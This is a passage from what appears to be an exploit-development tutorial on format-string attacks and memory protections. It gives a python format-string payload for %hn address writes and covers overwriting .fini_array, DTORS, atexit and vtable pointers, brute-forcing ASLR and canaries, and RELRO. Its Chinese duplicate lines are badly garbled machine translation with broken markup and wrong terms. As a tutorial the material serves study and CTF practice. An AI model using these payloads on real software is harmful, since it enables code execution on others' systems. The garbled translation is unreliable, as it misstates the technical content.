To write the address, usually 2 steps are done: You **first writes 2Bytes** of the address and then the other 2. To do so **`$hn`** is used.

è¦ç¼–å†™åœ°å€ï¼Œé€šå¸¸å®Œæˆäº†2ä¸ªæ­¥éª¤ï¼šæ‚¨**é¦–å…ˆå†™ä¸‹äº†åœ°å€çš„2ä¸ªbytes **ï¼Œç„¶åæ˜¯å¦ä¸€ä¸ª2.ä½¿ç”¨ã€‚

**HOB** is called to the 2 higher bytes of the address\

** hob **è¢«ç§°ä¸ºåœ°å€çš„2ä¸ªè¾ƒé«˜å­—èŠ‚\
**LOB** is called to the 2 lower bytes of the address

** lob **è¢«è°ƒç”¨åˆ°åœ°å€çš„2ä¸ªä½å­—èŠ‚

So, because of how format string works you need to **write first the smallest** of \[HOB, LOB] and then the other one.

å› æ­¤ï¼Œç”±äºæ ¼å¼å­—ç¬¦ä¸²çš„å·¥ä½œæ–¹å¼ï¼Œæ‚¨éœ€è¦**é¦–å…ˆå†™ä¸‹\ [hobï¼Œlob]çš„æœ€å°**ï¼Œç„¶åå†å†™å¦ä¸€ä¸ªã€‚

If HOB < LOB\

å¦‚æœhob <lob \
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

`[åœ°å€+2] [åœ°å€]ï¼…ã€‚[HOB-8] xï¼…[offset] \ $ hnï¼…ã€‚[lob-hob] xï¼…[offset+1]``

If HOB > LOB\

å¦‚æœhob> lob \
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

`[åœ°å€+2] [åœ°å€]ï¼…ã€‚[LOB-8] xï¼…[offset+1] \ $ hnï¼…ã€‚[hob-lob] xï¼…[offset]``

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

HOB LOB HOB \ SHELLCODE-8NÂºPARAM\ __ dir __ hob lob \ shell-hob \ _shellnÂºparam\ _dir \ _lob

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### **Format String Exploit Template**

### **æ ¼å¼å­—ç¬¦ä¸²åˆ©ç”¨æ¨¡æ¿**

You an find a **template** to exploit the GOT using format-strings here:

æ‚¨å¯ä»¥æ‰¾åˆ°ä¸€ä¸ª**æ¨¡æ¿**ï¼Œä»¥åˆ©ç”¨GOTä½¿ç”¨æ ¼å¼ä¸²åœ¨è¿™é‡Œï¼š

{% content-ref url="format-strings-template.md" %}

{ï¼…content-ref url =â€œ format-strings-template.mdâ€ï¼…}
[format-strings-template.md](format-strings-template.md)

[format-strings-template.md]ï¼ˆæ ¼å¼åŒ– - å¼¦ä¹ -  template.mdï¼‰
{% endcontent-ref %}

### **.fini\_array**

### **ã€‚fini \ _array **
Essentially this is a structure with **functions that will be called** before the program finishes. This is interesting if you can call your **shellcode just jumping to an address**, or in cases where you need to go back to main again to **exploit the format string a second time**.

ä»æœ¬è´¨ä¸Šè®²ï¼Œè¿™æ˜¯ä¸€ä¸ªå…·æœ‰**å‡½æ•°çš„ç»“æ„ï¼Œåœ¨ç¨‹åºå®Œæˆä¹‹å‰å°†è¢«ç§°ä¸º**ã€‚ å¦‚æœæ‚¨å¯ä»¥è°ƒç”¨æ‚¨çš„** shellCodeä»…è·³åˆ°åœ°å€**ï¼Œæˆ–è€…å¦‚æœæ‚¨éœ€è¦å†æ¬¡å›åˆ°Mainä»¥å†æ¬¡**å€Ÿç»™æ ¼å¼å­—ç¬¦ä¸²ï¼Œé‚£ä¹ˆè¿™å¾ˆæœ‰è¶£ã€‚

```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
 8049934 a0850408

#Put your address in 0x8049934
```

Note that this **won't** **create** an **eternal loop** because when you get back to main the canary will notice, the end of the stack might be corrupted and the function won't be recalled again. So with this you will be able to **have 1 more execution** of the vuln.

è¯·æ³¨æ„ï¼Œè¿™ä¸ª**ä¸ä¼š** **åˆ›å»º**ä¸€ä¸ª**æ°¸æ’çš„ç¯**ï¼Œå› ä¸ºå½“æ‚¨å›åˆ°Mainæ—¶ï¼Œé‡‘ä¸é›€ä¼šæ³¨æ„åˆ°ï¼Œå †æ ˆçš„ç»“æŸå¯èƒ½ä¼šæŸåï¼Œå¹¶ä¸”ä¸ä¼šå¬å›è¯¥åŠŸèƒ½ å†æ¬¡ã€‚ å› æ­¤ï¼Œæœ‰äº†è¿™ä¸ªï¼Œæ‚¨å°†å¯ä»¥**åˆæœ‰1ä¸ªvulnçš„æ‰§è¡Œ**ã€‚

### **Format Strings to Dump Content**

### **æ ¼å¼å­—ç¬¦ä¸²è½¬å‚¨å†…å®¹**

A format string can also be abused to **dump content** from the memory of the program.\

æ ¼å¼å­—ç¬¦ä¸²ä¹Ÿå¯ä»¥æ»¥ç”¨ä¸º**ä»ç¨‹åºçš„å†…å­˜ä¸­è½¬å‚¨**ã€‚
For example, in the following situation there is a **local variable in the stack pointing to a flag.** If you **find** where in **memory** the **pointer** to the **flag** is, you can make **printf access** that **address** and **print** the **flag**:

ä¾‹å¦‚ï¼Œåœ¨ä»¥ä¸‹æƒ…å†µä¸‹ï¼Œå †æ ˆä¸­æœ‰ä¸€ä¸ª**å±€éƒ¨å˜é‡æŒ‡å‘æ ‡å¿—ã€‚ *æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿** printfè®¿é—®** **åœ°å€**å’Œ** print ** ** flag **ï¼š

So, flag is in **0xffffcf4c**

å› æ­¤ï¼Œæ ‡å¿—åœ¨** 0xffffcf4c **ä¸­

![](<../../.gitbook/assets/image (622).png>)

And from the leak you can see the **pointer to the flag** is in the **8th** parameter:

ä»æ³„æ¼ä¸­ï¼Œæ‚¨å¯ä»¥çœ‹åˆ°**æŒ‡å‘æ ‡å¿—**çš„æŒ‡é’ˆåœ¨** 8th **å‚æ•°ä¸­ï¼š

![](<../../.gitbook/assets/image (623).png>)

So, **accessing** the **8th parameter** you can get the flag:

å› æ­¤ï¼Œ**è®¿é—®** **ç¬¬8ä¸ªå‚æ•°**æ‚¨å¯ä»¥è·å–æ ‡å¿—ï¼š

![](<../../.gitbook/assets/image (624).png>)

Note that following the **previous exploit** and realising that you can **leak content** you can **set pointers** to **`printf`** to the section where the **executable** is **loaded** and **dump** it **entirely**!

è¯·æ³¨æ„ï¼Œéµå¾ª**ä»¥å‰çš„æ¼æ´åˆ©ç”¨**å¹¶æ„è¯†åˆ°æ‚¨å¯ä»¥**æ³„æ¼å†…å®¹**æ‚¨å¯ä»¥**å°†Pointers **è®¾ç½®ä¸º** printf` ** ** **å¯æ‰§è¡Œ**æ˜¯**çš„éƒ¨åˆ† å·²åŠ è½½**å’Œ**è½¬å‚¨** IT **å®Œå…¨**ï¼

### **DTOR**

{% hint style="danger" %}
Nowadays is very **weird to find a binary with a dtor section**.

å¦‚ä»Šï¼Œå¾ˆå¥‡æ€ªåœ°æ‰¾åˆ°å¸¦æœ‰DTORéƒ¨åˆ†**çš„äºŒè¿›åˆ¶æ–‡ä»¶ã€‚
{% endhint %}

The destructor are functions that are **executed before program finishes**.\

ç ´åè€…æ˜¯åœ¨ç¨‹åºå®Œæˆä¹‹å‰æ‰§è¡Œ**çš„å‡½æ•°**ã€‚
If you manage to **write** an **address** to a **shellcode** in **`__DTOR_END__`** , that will be **executed** before the programs ends.\

å¦‚æœæ‚¨è®¾æ³•**å†™** an **åœ°å€** ** shellCode ** in ** ___dtor_end__` ** **ï¼Œåˆ™å°†åœ¨ç¨‹åºç»“æŸä¹‹å‰**æ‰§è¡Œ**ã€‚
Get the address of this section with:

è·å–æœ¬èŠ‚çš„åœ°å€ï¼š

```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep â€œ__DTORâ€
```

Usually you will find the **DTOR** section **between** the values `ffffffff` and `00000000`. So if you just see those values, it means that there **isn't any function registered**. So **overwrite** the **`00000000`** with the **address** to the **shellcode** to execute it.

é€šå¸¸ï¼Œæ‚¨ä¼šåœ¨** ffffffff`å’Œ`00000000`''ä¹‹é—´æ‰¾åˆ°** dtor **éƒ¨åˆ†**ã€‚ å› æ­¤ï¼Œå¦‚æœæ‚¨åªçœ‹åˆ°è¿™äº›å€¼ï¼Œåˆ™æ„å‘³ç€**æ²¡æœ‰ä»»ä½•å‡½æ•°æ³¨å†Œ**ã€‚ å› æ­¤ï¼Œ** offrite ** **`00000000` **å¸¦æœ‰**åœ°å€** ** shellCode **æ‰§è¡Œå®ƒã€‚

### **Format Strings to Buffer Overflows**

### **æ ¼å¼å­—ç¬¦ä¸²åˆ°ç¼“å†²åŒºæº¢å‡º**

Tthe **sprintf moves** a formatted string **to** a **variable.** Therefore, you could abuse the **formatting** of a string to cause a **buffer overflow in the variable** where the content is copied to.\

** sprintfç§»åŠ¨**æ ¼å¼çš„å­—ç¬¦ä¸²**åˆ°** a **å˜é‡ã€‚ å†…å®¹è¢«å¤åˆ¶åˆ°ã€‚
For example, the payload `%.44xAAAA` will **write 44B+"AAAA" in the variable**, which may cause a buffer overflow.

ä¾‹å¦‚ï¼Œæœ‰æ•ˆè½½è·`ï¼….44xaaaaå°†**åœ¨å˜é‡**ä¸­å†™44b+â€œ aaaaâ€ï¼Œè¿™å¯èƒ½ä¼šå¯¼è‡´ç¼“å†²åŒºæº¢å‡ºã€‚

### **\_\_atexit Structures**

### **\_\_atexit Structures**

{% hint style="danger" %}
Nowadays is very **weird to exploit this**.

å¦‚ä»Šï¼Œå¾ˆå¥‡æ€ªåœ°åˆ©ç”¨è¿™ä¸ª**ã€‚
{% endhint %}

**`atexit()`** is a function to which **other functions are passed as parameters.** These **functions** will be **executed** when executing an **`exit()`** or the **return** of the **main**.\

** a atexitï¼ˆï¼‰`**æ˜¯ä¸€ä¸ªå‡½æ•°**å…¶ä»–å‡½æ•°ä½œä¸ºå‚æ•°ä¼ é€’ã€‚ æˆ–** main **çš„**è¿”å›**ã€‚
If you can **modify** the **address** of any of these **functions** to point to a shellcode for example, you will **gain control** of the **process**, but this is currently more complicated.\

å¦‚æœæ‚¨å¯ä»¥**ä¿®æ”¹** **åœ°å€** **å‡½æ•°**æŒ‡å‘shellCodeï¼Œåˆ™æ‚¨å°†**è·å¾—**çš„æ§åˆ¶** ** process **ï¼Œä½†è¿™æ˜¯ ç›®å‰æ›´å¤æ‚ã€‚\
Currently the **addresses to the functions** to be executed are **hidden** behind several structures and finally the address to which it points are not the addresses of the functions, but are **encrypted with XOR** and displacements with a **random key**. So currently this attack vector is **not very useful at least on x86** and **x64\_86**.\

å½“å‰ï¼Œè¦æ‰§è¡Œçš„å‡½æ•°**çš„**åœ°å€æ˜¯åœ¨å‡ ä¸ªç»“æ„åé¢çš„**éšè—**ï¼Œæœ€åæ˜¯æŒ‡å‘å…¶æŒ‡å‘çš„åœ°å€ä¸æ˜¯å‡½æ•°çš„åœ°å€ï¼Œè€Œæ˜¯ç”¨XOR **åŠ å¯†çš„ï¼Œå¹¶å¸¦æœ‰ä½ç§»ã€‚ **éšæœºå¯†é’¥**ã€‚ å› æ­¤ï¼Œç›®å‰ï¼Œæ­¤æ”»å‡»å‘é‡**è‡³å°‘åœ¨x86 **å’Œ** x64 \ _86 **ã€‚
The **encryption function** is **`PTR_MANGLE`**. **Other architectures** such as m68k, mips32, mips64, aarch64, arm, hppa... **do not implement the encryption** function because it **returns the same** as it received as input. So these architectures would be attackable by this vector.

**åŠ å¯†å‡½æ•°**æ˜¯** ptr_mangle` **ã€‚ **å…¶ä»–ä½“ç³»ç»“æ„**ï¼Œä¾‹å¦‚M68Kï¼ŒMIPS32ï¼ŒMIPS64ï¼ŒAARCH64ï¼ŒARMï¼ŒHPPA ... **è¯·å‹¿å®ç°åŠ å¯†**åŠŸèƒ½ï¼Œå› ä¸ºå®ƒ**è¿”å›äº†ä¸è¾“å…¥ç›¸åŒçš„**ã€‚ å› æ­¤ï¼Œè¿™äº›æ¶æ„å°†å—åˆ°è¯¥å‘é‡çš„æ”»å‡»ã€‚

### **setjmp() & longjmp()**

{% hint style="danger" %}
Nowadays is very **weird to exploit this**.

å¦‚ä»Šï¼Œå¾ˆå¥‡æ€ªåœ°åˆ©ç”¨è¿™ä¸ª**ã€‚
{% endhint %}

**`Setjmp()`** allows to **save** the **context** (the registers)\

**`setjmpï¼ˆï¼‰
**`longjmp()`** allows to **restore** the **context**.\

**`longjmpï¼ˆï¼‰`**å…è®¸**è¿˜åŸ** **ä¸Šä¸‹æ–‡**ã€‚
The **saved registers** are: `EBX, ESI, EDI, ESP, EIP, EBP`\

**ä¿å­˜çš„å¯„å­˜å™¨**æ˜¯ï¼š`ebxï¼Œesiï¼Œediï¼Œespï¼Œeipï¼Œebp` \
What happens is that EIP and ESP are passed by the **`PTR_MANGLE`** function, so the **architecture vulnerable to this attack are the same as above**.\

å‘ç”Ÿçš„äº‹æƒ…æ˜¯EIPå’ŒESPç”±**``ptr_mangle` **å‡½æ•°ä¼ é€’ï¼Œå› æ­¤**æ¶æ„å®¹æ˜“å—åˆ°æ­¤æ”»å‡»çš„å½±å“ä¸ä¸Šè¿°**ã€‚
They are useful for error recovery or interrupts.\

å®ƒä»¬å¯¹äºé”™è¯¯æ¢å¤æˆ–ä¸­æ–­å¾ˆæœ‰ç”¨ã€‚
However, from what I have read, the other registers are not protected, **so if there is a `call ebx`, `call esi` or `call edi`** inside the function being called, control can be taken over. Or you could also modify EBP to modify the ESP.

ä½†æ˜¯ï¼Œä»æˆ‘é˜…è¯»çš„å†…å®¹æ¥çœ‹ï¼Œå…¶ä»–å¯„å­˜å™¨æ²¡æœ‰å—åˆ°ä¿æŠ¤ï¼Œ**å› æ­¤ï¼Œå¦‚æœæœ‰â€œå‘¼å«ebxâ€ï¼Œåˆ™``å‘¼å«esi''æˆ–`å‘¼å«edi'**åœ¨è¢«è°ƒç”¨çš„å‡½æ•°ä¸­ï¼Œå¯ä»¥æ¥ç®¡æ§åˆ¶ã€‚ æˆ–è€…ï¼Œæ‚¨ä¹Ÿå¯ä»¥ä¿®æ”¹EBPæ¥ä¿®æ”¹ESPã€‚

**VTable y VPTR en C++**

Each class has a **Vtable** which is an array of **pointers to methods**.

æ¯ä¸ªç±»éƒ½æœ‰ä¸€ä¸ª** vtable **ï¼Œè¿™æ˜¯æ–¹æ³•**çš„ä¸€ç³»åˆ—**ã€‚

Each object of a **class** has a **VPtr** which is a **pointer** to the arrayof its class. The VPtr is part of the header of each object, so if an **overwrite** of the **VPtr** is achieved it could be **modified** to **point** to a dummy method so that executing a function would go to the shellcode.

**ç±»**çš„æ¯ä¸ªå¯¹è±¡éƒ½æœ‰ä¸€ä¸ª** vptr **ï¼Œè¿™æ˜¯å¯¹é˜µåˆ—çš„**æŒ‡é’ˆ**ã€‚ VPTRæ˜¯æ¯ä¸ªå¯¹è±¡æ ‡é¢˜çš„ä¸€éƒ¨åˆ† åŠŸèƒ½å°†è½¬åˆ°ShellCodeã€‚

## **Medidas preventivas y evasiones**

**ASLR no tan aleatorio**

PaX dive el espacio de direcciones del proceso en 3 grupos:

Codigo y datos iniciados y no iniciados: .text, .data y .bss â€”> 16bits de entropia en la variable delta\_exec, esta variable se inicia aleatoriamente con cada proceso y se suma a las direcciones iniciales

Memoria asignada por mmap() y libraries compartidas â€”> 16bits, delta\_mmap

El stack â€”> 24bits, delta\_stack â€”> Realmente 11 (del byte 10Âº al 20Âº inclusive) â€”>alineado a 16bytes â€”> 524.288 posibles direcciones reales del stack

Las variables de entorno y los argumentos se desplazan menos que un buffer en el stack.

**Return-into-printf**

** return-into-printf **

Es una tÃ©cnica para convertir un buffer overflow en un error de cadena de formato. Consiste en sustituir el EIP para que apunte a un printf de la funciÃ³n y pasarle como argumento una cadena de formato manipulada para obtener valores sobre el estado del proceso.

**Ataque a librerÃ­as**

Las librerÃ­as estÃ¡n en una posiciÃ³n con 16bits de aleatoriedad = 65636 posibles direcciones. Si un servidor vulnerable llama a fork() el espacio de direcciones de memoria es clocado en el proceso hijo y se mantiene intacto. Por lo que se puede intentar hacer un brute force a la funciÃ³n usleep() de libc pasÃ¡ndole como argumento â€œ16â€ de forma que cuando tarde mÃ¡s de lo normal en responder se habrÃ¡ encontrado dicha funciÃ³n. Sabiendo dÃ³nde estÃ¡ dicha funciÃ³n se puede obtener delta\_mmap y calcular las demÃ¡s.

La Ãºnica forma de estar seguros de que el ASLR funciona es usando arquitectura de 64bits. AhÃ­ no hay ataques de fuerza bruta.

**StackGuard y StackShield**

** stackguard y stackshield **

**StackGuard** inserta antes del EIP â€”> 0x000aff0d(null, \n, EndOfFile(EOF), \r) â€”> Siguen siendo vulnerables recv(), memcpy(), read(), bcoy() y no protege el EBP

**StackShield** es mÃ¡s elaborado que StackGuard

Guarda en una tabla (Global Return Stack) todas las direcciones EIP de vuelta de forma que el overflow no cause ningÃºn daÃ±o. Ademas, se pueden comparar ambas direcciones para a ver si ha habido un desbordamiento.

TambiÃ©n se puede comprobar la direcciÃ³n de retorno con un valor lÃ­mite, asÃ­ si el EIP se va a un sitio distinto del habitual como el espacio de datos se sabrÃ¡. Pero esto se sortea con Ret-to-lib, ROPs o ret2ret.

Como se puede ver stackshield tampoco protege las variables locales.

**Stack Smash Protector (ProPolice) -fstack-protector**

**å †æ ˆç²‰ç¢ä¿æŠ¤å™¨ï¼ˆPropoliceï¼‰-Fstack -Protector **

Se pone el canary antes del EBP. Reordena las variables locales para que los buffers estÃ©n en las posiciones mÃ¡s altas y asÃ­ no puedan sobreescribir otras variables.

AdemÃ¡s, realiza una copia segura de los argumentos pasados encima de la pila (encima de las vars locales) y usa estas copias como argumentos.

No puede proteger arrays de menos de 8 elementos ni buffers que formen parte de una estructura del usuario.

El canary es un nÃºmero random sacado de â€œ/dev/urandomâ€ o sino es 0xff0a0000. Se almacena en TLS(Thread Local Storage). Los hilos comparten el mismo espacio de memoria, el TLS es un Ã¡rea que tiene variables globales o estÃ¡ticas de cada hilo. Sin embargo, en ppio estas son copiadas del proceso padre aunque el proceso hijo podrÃ­a modificar estos datos sin modificar los del padre ni los de los demÃ¡s hijos. El problema es que si se usa fork() pero no se crea un nuevo canario, entonces todos los procesos (padre e hijos) usan el mismo canario. En i386 se almacena en gs:0x14 y en x86\_64 se almacena en fs:0x28

Esta protecciÃ³n localiza funciones que tengan buffer que puedan ser atacados e incluye en ellas cÃ³digo al ppio de la funciÃ³n para colocar el canario y cÃ³digo al final para comprobarlo.

La funciÃ³n fork() realiza una copia exacta del proceso del padre, por eso mismo si un servidor web llama a fork() se puede hacer un ataque de fuerza bruta byte por byte hasta averiguar el canary que se estÃ¡ utilizando.

Si se usa la funciÃ³n execve() despuÃ©s de fork(), se sobreescribe el espacio y el ataque ya no es posible. vfork() permite ejecutar el proceso hijo sin crear un duplicado hasta que el proceso hijo intentase escribir, entonces sÃ­ creaba el duplicado.

**Relocation Read-Only (RELRO)**

**é‡æ–°å®šä½ä»…é˜…è¯»ï¼ˆrelroï¼‰**

### Relro

**Relro (Read only Relocation)** affects the memory permissions similar to NX. The difference is whereas with NX it makes the stack executable, RELRO makes **certain things read only** so we **can't write** to them. The most common way I've seen this be an obstacle is preventing us from doing a **`got` table overwrite**, which will be covered later. The `got` table holds addresses for libc functions so that the binary knows what the addresses are and can call them. Let's see what the memory permissions look like for a `got` table entry for a binary with and without relro.

** relroï¼ˆä»…è¯»å–é‡ç½®ï¼‰**å½±å“ä¸NXç›¸ä¼¼çš„å†…å­˜æƒé™ã€‚ åŒºåˆ«åœ¨äºNXä½¿å †æ ˆå¯æ‰§è¡Œï¼ŒRelroä½¿**ä»…è¯»**ï¼Œå› æ­¤æˆ‘ä»¬**ä¸èƒ½å†™**ã€‚ æˆ‘çœ‹åˆ°è¿™æ˜¯ä¸€ä¸ªéšœç¢çš„æœ€å¸¸è§æ–¹æ³•æ˜¯é˜»æ­¢æˆ‘ä»¬åšä¸€ä¸ª````get''table overrite ** offrite **ã€‚ â€œ Gotâ€è¡¨ä¿ç•™äº†LIBCå‡½æ•°çš„åœ°å€ï¼Œä»¥ä¾¿äºŒè¿›åˆ¶çŸ¥é“åœ°å€æ˜¯ä»€ä¹ˆå¹¶å¯ä»¥ç§°å‘¼å®ƒä»¬ã€‚ è®©æˆ‘ä»¬çœ‹çœ‹æœ‰å’Œæ²¡æœ‰Relroçš„äºŒè¿›åˆ¶æ–‡ä»¶çš„â€œè·å¾—â€è¡¨æ¡ç›®çš„å†…å­˜æƒé™çš„æ ·å­ã€‚

With relro:

ä¸Relroï¼š

```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
  0x555555557fd0 - 0x555555557fe8  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```

Without relro:

æ²¡æœ‰relroï¼š

```bash
gefâ¤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
0x0000000000403000 0x0000000000404000 0x0000000000002000 r-- /tmp/try
0x0000000000404000 0x0000000000405000 0x0000000000003000 rw- /tmp/try
0x0000000000405000 0x0000000000426000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gefâ¤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gefâ¤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/try'(0x404000-0x405000), permission=rw-
  0x404018 - 0x404030  â†’   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```

For the binary **without relro**, we can see that the `got` entry address for `fgets` is `0x404018`. Looking at the memory mappings we see that it falls between `0x404000` and `0x405000`, which has the **permissions `rw`**, meaning we can read and write to it. For the binary **with relro**, we see that the `got` table address for the run of the binary (pie is enabled so this address will change) is `0x555555557fd0`. In that binary's memory mapping it falls between `0x0000555555557000` and `0x0000555555558000`, which has the memory **permission `r`**, meaning that we can only read from it.

å¯¹äºæ²¡æœ‰relro **çš„äºŒè¿›åˆ¶**ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°``fgets''çš„â€œè¿›å…¥åœ°å€â€æ˜¯`0x404018`ã€‚ æŸ¥çœ‹å†…å­˜æ˜ å°„ï¼Œæˆ‘ä»¬çœ‹åˆ°å®ƒä»‹äºâ€œ 0x404000â€å’Œ`0x405000`ä¹‹é—´ï¼Œå®ƒå…·æœ‰**æƒé™`rw` ** ** **ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬å¯ä»¥è¯»å–å¹¶å†™å…¥å®ƒã€‚ å¯¹äºå¸¦æœ‰relro **çš„äºŒè¿›åˆ¶**ï¼Œæˆ‘ä»¬çœ‹åˆ°äºŒè¿›åˆ¶è¿è¡Œçš„```'''è¡¨åœ°å€ï¼ˆå¯ç”¨äº†pieï¼Œå› æ­¤æ­¤åœ°å€å°†ä¼šæ›´æ”¹ï¼‰ä¸º`0x5555555557FD0`ã€‚ åœ¨è¯¥äºŒè¿›åˆ¶å†…å­˜æ˜ å°„ä¸­ï¼Œå®ƒä»‹äºâ€œ 0x00005555555557000â€å’Œ`0x00005555555555558000ä¸­ï¼Œå…·æœ‰å†…å­˜** r` ** ** **ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½ä»ä¸­è¯»å–ã€‚

So what's the **bypass**? The typical bypass I use is to just don't write to memory regions that relro causes to be read only, and **find a different way to get code execution**.

é‚£ä¹ˆ**æ—è·¯**æ˜¯ä»€ä¹ˆï¼Ÿ æˆ‘ä½¿ç”¨çš„å…¸å‹æ—è·¯æ˜¯ä¸è¦å†™å…¥ä»…è¯»å–çš„è®°å¿†åŒºåŸŸï¼Œå¹¶ä¸”**æ‰¾åˆ°ä¸€ç§è·å¾—ä»£ç æ‰§è¡Œ**çš„ä¸åŒæ–¹æ³•ã€‚

Note that in order for this to happen the binary needs to know previous to execution the addresses to the functions:

è¯·æ³¨æ„ï¼Œä¸ºäº†å®ç°è¿™ç§æƒ…å†µï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶éœ€è¦åœ¨æ‰§è¡Œå‡½æ•°çš„åœ°å€ä¹‹å‰çŸ¥é“ï¼š

* Lazy binding: The address of a function is searched the first time the function is called. So, the GOT needs to have write permissions during execution.

*æ‡’æƒ°ç»‘å®šï¼šå‡½æ•°ç¬¬ä¸€æ¬¡è°ƒç”¨å‡½æ•°çš„åœ°å€ã€‚ å› æ­¤ï¼Œåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­ï¼ŒGOTéœ€è¦å…·æœ‰å†™å…¥æƒé™ã€‚
* Bind now: The addresses of the functions are solved at the begginig of the execution, then read-only permissions are given to sensitive sections like .got, .dtors, .ctors, .dynamic, .jcr. `` `** ``-z relro`**`y`**`-z now\`\*\*

*ç«‹å³ç»‘å®šï¼šå‡½æ•°çš„åœ°å€æ˜¯åœ¨æ‰§è¡Œçš„é‡æ„ä¸­æ±‚è§£çš„ï¼Œç„¶åå°†ä»…è¯»å–çš„æƒé™ç»™äºˆæ•æ„Ÿéƒ¨åˆ†ï¼Œä¾‹å¦‚.gotï¼Œ.dtorsï¼Œ.ctorsï¼Œ.ctorsï¼Œ.dynamicï¼Œ.jcrã€‚ ``**``-z relro` **

To check if a program uses Bind now you can do:

